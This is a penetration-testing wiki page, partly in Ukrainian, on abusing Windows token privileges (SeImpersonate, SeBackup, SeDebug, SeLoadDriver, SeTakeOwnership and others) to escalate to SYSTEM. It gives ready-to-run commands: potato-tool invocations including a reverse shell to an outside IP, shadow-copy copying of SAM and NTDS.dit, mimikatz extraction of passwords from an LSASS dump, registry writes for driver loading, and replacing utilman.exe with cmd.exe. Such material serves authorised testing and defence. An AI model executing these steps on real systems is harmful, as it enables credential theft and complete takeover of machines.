# Abusing Tokens

{{#include ../../banners/hacktricks-training.md}}

## Tokens

If you **don't know what are Windows Access Tokens** read this page before continuing:


{{#ref}}
access-tokens.md
{{#endref}}

**Можливо, ви зможете підвищити привілеї, зловживаючи token, які у вас уже є**

### SeImpersonatePrivilege

Це privilege, яке має будь-який process, і воно дозволяє impersonation (але не creation) будь-якого token, якщо до нього можна отримати handle. Privileged token можна отримати з Windows service (DCOM), спонукавши його виконати NTLM authentication проти exploit, а потім увімкнувши execution process із SYSTEM privileges. Цю vulnerability можна експлуатувати за допомогою різних tool, таких як [juicy-potato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (який вимагає, щоб winrm був disabled), [SweetPotato](https://github.com/CCob/SweetPotato), і [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

Modern operator notes:

- **JuicyPotato is legacy**: on Windows 10 1809+/Server 2019+, prefer **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato**, or **PrintSpoofer** depending on which RPC/COM surface is still reachable.
- If you compromised a service running as **`LOCAL SERVICE`** or **`NETWORK SERVICE`** and `whoami /priv` shows a **filtered token** without `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege`, recover the account's **default privilege set** first (for example with **FullPowers**) and retry the potato family afterwards.
- Some newer forks are more operator-friendly than the original tools. For example, **SigmaPotato** adds reflection/in-memory execution and modern Windows compatibility, while **PrintNotifyPotato** abuses the PrintNotify COM service and is often useful when the classic Spooler path is disabled.
```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

Воно дуже схоже на **SeImpersonatePrivilege**, воно використовуватиме **той самий метод** для отримання привілейованого token.\
Потім цей privilege дозволяє **призначити primary token** новому/призупиненому процесу. З привілейованим impersonation token ви можете похідно отримати primary token (DuplicateTokenEx).\
За допомогою token ви можете створити **новий процес** через 'CreateProcessAsUser' або створити процес у стані suspended і **встановити token** (загалом ви не можете змінити primary token процесу, що вже працює).

### SeTcbPrivilege

Якщо у вас увімкнено цей token, ви можете використати **KERB_S4U_LOGON**, щоб отримати **impersonation token** для будь-якого іншого користувача без знання credentials, **додати довільну групу** (admins) до token, встановити **integrity level** token на "**medium**", і призначити цей token **поточному thread** (SetThreadToken).

### SeBackupPrivilege

Цей privilege змушує систему **надавати весь доступ на читання** до будь-якого file (лише для операцій читання). Його використовують для **читання password hashes локальних облікових записів Administrator** з registry, після чого можна використовувати tools на кшталт "**psexec**" або "**wmiexec**" з hash (техніка Pass-the-Hash). Однак ця technique не спрацьовує за двох умов: коли Local Administrator account вимкнено або коли діє policy, що забирає administrative rights у Local Administrators, які підключаються remotely.\
На практиці найнадійніший вбудований workflow зазвичай — **VSS + `robocopy /b`**: створити/відкрити shadow copy, а потім скопіювати `SAM`/`SYSTEM` або `NTDS.dit` у **backup mode**, що обходить file ACLs.
```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```
You can **abuse this privilege** with:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- following **IppSec** in [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)
- Or as explained in the **escalating privileges with Backup Operators** section of:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

Дозвіл на **write access** до будь-якого системного файла, незалежно від Access Control List (ACL) файла, надається цим привілеєм. Це відкриває численні можливості для escalation, зокрема можливість **modify services**, виконувати DLL Hijacking і встановлювати **debuggers** через Image File Execution Options, а також інші техніки.

### SeCreateTokenPrivilege

SeCreateTokenPrivilege — це потужний дозвіл, особливо корисний, коли користувач має змогу impersonate tokens, але також і за відсутності SeImpersonatePrivilege. Ця можливість ґрунтується на здатності impersonate token, який представляє того самого користувача і чий integrity level не перевищує рівень поточного процесу.

**Key Points:**

- **Impersonation without SeImpersonatePrivilege:** Можна використати SeCreateTokenPrivilege для EoP, impersonating tokens за певних умов.
- **Conditions for Token Impersonation:** Успішний impersonation вимагає, щоб target token належав тому самому користувачу та мав integrity level, який менший або дорівнює integrity level процесу, що намагається виконати impersonation.
- **Creation and Modification of Impersonation Tokens:** Користувачі можуть створити impersonation token і посилити його, додавши SID (Security Identifier) привілейованої групи.

### SeLoadDriverPrivilege

Цей привілей дозволяє **load and unload device drivers** шляхом створення запису в реєстрі зі спеціальними значеннями `ImagePath` і `Type`. Оскільки прямий write access до `HKLM` (HKEY_LOCAL_MACHINE) обмежено, потрібно використовувати `HKCU` (HKEY_CURRENT_USER). Однак, щоб `HKCU` був розпізнаний ядром для конфігурації driver, потрібно дотриматися певного шляху.

Modern offensive use is usually **BYOVD** (bring your own vulnerable driver): load a **signed but vulnerable** kernel driver and then use its IOCTLs to disable protections or jump to kernel code execution. Keep in mind that on recent Windows 11/Server builds the **Microsoft vulnerable driver blocklist** and/or **HVCI/Memory Integrity** often break older public chains, so the classic `szkg64.sys`-style examples are no longer universally reliable.

Цей шлях — `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, де `<RID>` — Relative Identifier поточного користувача. Усередині `HKCU` потрібно створити весь цей шлях і встановити два значення:

- `ImagePath`, which is the path to the binary to be executed
- `Type`, зі значенням `SERVICE_KERNEL_DRIVER` (`0x00000001`).

**Steps to Follow:**

1. Access `HKCU` instead of `HKLM` due to restricted write access.
2. Create the path `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` within `HKCU`, where `<RID>` represents the current user's Relative Identifier.
3. Set the `ImagePath` to the binary's execution path.
4. Assign the `Type` as `SERVICE_KERNEL_DRIVER` (`0x00000001`).
```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```
Більше способів зловживати цим привілеєм у [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

Це схоже на **SeRestorePrivilege**. Його основна функція дозволяє процесу **взяти у власність об’єкт**, обходячи вимогу явного discretionary access через надання WRITE_OWNER access rights. Процес спочатку полягає в отриманні ownership потрібного registry key для цілей запису, а потім у зміні DACL, щоб увімкнути write operations.
```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```
### SeDebugPrivilege

Цей privilege дозволяє **debug інших процесів**, включно з читанням і записом у memory. З цим privilege можна застосовувати різні стратегії memory injection, здатні обходити більшість antivirus і host intrusion prevention рішень.

На сучасному Windows пам’ятайте, що `SeDebugPrivilege` зазвичай достатньо, щоб відкрити **non-protected SYSTEM processes** і дублювати їхні tokens, але це **не** гарантує, що ви зможете працювати з **LSASS**. Якщо **RunAsPPL / LSA Protection** увімкнено, non-protected processes не можуть читати або inject у LSASS, навіть якщо присутній `SeDebugPrivilege`. У такому разі вкрадіть token з іншого non-PPL SYSTEM process або поєднайте це з PPL bypass/BYOVD замість того, щоб припускати, що `procdump` спрацює. Для повного прикладу копіювання token за допомогою `SeDebugPrivilege` + `SeImpersonatePrivilege` дивіться [this page](sedebug-+-seimpersonate-copy-token.md).

#### Dump memory

Ви можете використати [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) з [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite), щоб **capture the memory of a process**. Зокрема, це може застосовуватися до процесу **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)**, який відповідає за зберігання user credentials після успішного входу користувача в систему.

Потім ви можете завантажити цей dump у mimikatz, щоб отримати passwords:
```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
#### RCE

Якщо ви хочете отримати `NT SYSTEM` shell, ви можете використати:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)
```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```
### SeManageVolumePrivilege

Це право (Perform volume maintenance tasks) дозволяє відкривати необроблені дескриптори пристроїв тому (наприклад, \\.\C:) для прямого дискового I/O, що обходить NTFS ACLs. З ним можна копіювати байти будь-якого файлу на тому, читаючи базові блоки, що дає змогу виконувати arbitrary file read чутливих даних (наприклад, machine private keys у %ProgramData%\Microsoft\Crypto\, registry hives, SAM/NTDS via VSS). Це особливо критично на CA servers, де витік CA private key дає змогу підробити Golden Certificate, щоб impersonate будь-який principal.

Див. детальні techniques і mitigations:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{endref}}

## Check privileges
```
whoami /priv
```
**Токени, що відображаються як Disabled**, зазвичай можна увімкнути, тож ви часто можете зловживати як _Enabled_, так і _Disabled_ привілеями.

### Enable All the tokens

Якщо у вас є disabled privileges, ви можете використати скрипт [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1), щоб увімкнути всі токени:
```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```
Або **script**, вбудований у цьому [**post**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/).

## Table

Повний cheatsheet прав token у [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin), нижче наведено лише прямі способи експлуатації привілею для отримання admin session або читання sensitive files.

| Privilege                  | Impact      | Tool                    | Execution path                                                                                                                                                                                                                                                                                                                                     | Remarks                                                                                                                                                                                                                                                                                                                        |
| ------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | 3rd party tool          | _"It would allow a user to impersonate tokens and privesc to nt system using tools such as potato.exe, rottenpotato.exe and juicypotato.exe"_                                                                                                                                                                                                      | Дякую [Aurélien Chalot](https://twitter.com/Defte_) за оновлення. Я спробую незабаром перефразувати це у більш recipe-like вигляді.                                                                                                                                                                                           |
| **`SeBackup`**             | **Threat**  | _**Built-in commands**_ | Читання sensitive files за допомогою `robocopy /b` або спеціальних SeBackup-aware copy helpers.                                                                                                                                                                                                                                                   | <p>- Чудово підходить для `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit`, а іноді й `%WINDIR%\MEMORY.DMP`.<br><br>- `robocopy` зручний, але спеціальні SeBackup cmdlets/APIs часто гнучкіші для locked/open files.</p>                                                                                                              |
| **`SeCreateToken`**        | _**Admin**_ | 3rd party tool          | Створити arbitrary token, включно з local admin rights, за допомогою `NtCreateToken`.                                                                                                                                                                                                                                                              |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | Duplicate a **non-PPL** SYSTEM token або dump memory з non-protected process.                                                                                                                                                                                                                                                                     | <p>LSASS dumping зазвичай blocked, якщо увімкнено RunAsPPL/LSA Protection.</p><p>Script можна знайти на [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                                                 |
| **`SeImpersonate`**        | _**Admin**_ | 3rd party tool          | Використати **Potato family** / named-pipe impersonation, щоб запустити SYSTEM (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato`, тощо).                                                                                                                                                                           | <p>Найпрактичніше з service accounts, таких як IIS APPPOOL, MSSQL, scheduled tasks, або будь-якого context, який уже має `SeImpersonatePrivilege`.</p>                                                                                                                                                                           |
| **`SeLoadDriver`**         | _**Admin**_ | 3rd party tool          | <p>1. Завантажити signed-but-vulnerable kernel driver (BYOVD)<br>2. Використати IOCTLs драйвера, щоб отримати kernel R/W, вимкнути security tooling або підвищити права до SYSTEM<br><br>Альтернативно, privilege може бути використаний для unload security-related drivers за допомогою вбудованої команди <code>fltMC</code>, тобто <code>fltMC sysmondrv</code></p>                     | <p>Старі public drivers, такі як <code>szkg64.sys</code>, дедалі частіше blocked у сучасному Windows через vulnerable-driver blocklist / HVCI.</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. Запустити PowerShell/ISE, маючи SeRestore privilege.<br>2. Увімкнути privilege за допомогою <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>).<br>3. Перейменувати utilman.exe на utilman.old<br>4. Перейменувати cmd.exe на utilman.exe<br>5. Заблокувати console і натиснути Win+U</p> | <p>Attack може бути detected деяким AV software.</p><p>Alternative method relies on replacing service binaries stored in "Program Files" using the same privilege</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Built-in commands**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. Перейменувати cmd.exe на utilman.exe<br>4. Заблокувати console і натиснути Win+U</p>                                                                                                                                       | <p>Attack може бути detected деяким AV software.</p><p>Alternative method relies on replacing service binaries stored in "Program Files" using the same privilege.</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | 3rd party tool          | <p>Manipulate tokens, щоб у них були включені local admin rights. May require SeImpersonate.</p><p>To be verified.</p>                                                                                                                                                                                                                             |                                                                                                                                                                                                                                                                                                                                |

## References

- Подивіться на цю таблицю, що визначає Windows tokens: [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin)
- Подивіться на [**this paper**](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt) про privesc з token.
- itm4n – Give Me Back My Privileges! Please? (restricted service tokens / FullPowers): https://itm4n.github.io/localservice-privileges/
- Microsoft – Robocopy (`/b` backup mode bypasses file/folder ACL checks): https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy
- Microsoft – Perform volume maintenance tasks (SeManageVolumePrivilege): https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks
- 0xdf – HTB: Certificate (SeManageVolumePrivilege → CA key exfil → Golden Certificate): https://0xdf.gitlab.io/2025/10/04/htb-certificate.html

{{#include ../../banners/hacktricks-training.md}}
